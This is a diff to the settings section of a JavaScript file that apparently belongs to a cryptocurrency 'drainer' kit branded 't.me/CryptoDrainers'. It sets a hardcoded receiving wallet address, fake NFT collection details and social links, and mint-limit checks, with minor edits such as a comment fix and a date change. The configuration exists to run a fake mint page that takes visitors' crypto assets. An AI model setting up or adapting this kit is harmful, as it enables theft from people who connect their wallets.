@@ -1,6 +1,6 @@
 
 /*
-    = = = = = YOU WALLET ADRESS = = = = =
+    = = = = = YOUR WALLET ADRESS = = = = =
 */
 
 const receiveAddress = "0x4E02375a803462FE27cb489e7C16ade676f13cD8";
@@ -11,10 +11,10 @@ const receiveAddress = "0x4E02375a803462FE27cb489e7C16ade676f13cD8";
 
 const collectionInfo = {
     name: "t.me/CryptoDrainers",
-    date: "13.05.2022",
+    date: "15.05.2022",
     socialMedia: {
-        discord: "discord.gg/invite_here",
-        twitter: "https://twitter.com/username_here",
+        discord: "discord.gg/",
+        twitter: "https://twitter.com/logout",
     },
     medias: {
         preview: "prev.gif", // You can change it with files in assets
@@ -63,7 +63,7 @@ const customStrings = {
     = = = = = END OF SETTINGS = = = = =
 */
 
-//#region Check Configuration
+// #region Check Configuration
 if (mintInfo.minUnits > mintInfo.maxUnits) console.error(`Error: minUnits (${mintInfo.minUnits}) is greater than maxUnits (${maxUnits})`);
 if (mintInfo.minUnits <= 0) console.error(`Error: minUnits (${mintInfo.minUnits}) is less than or equal to 0`);
 
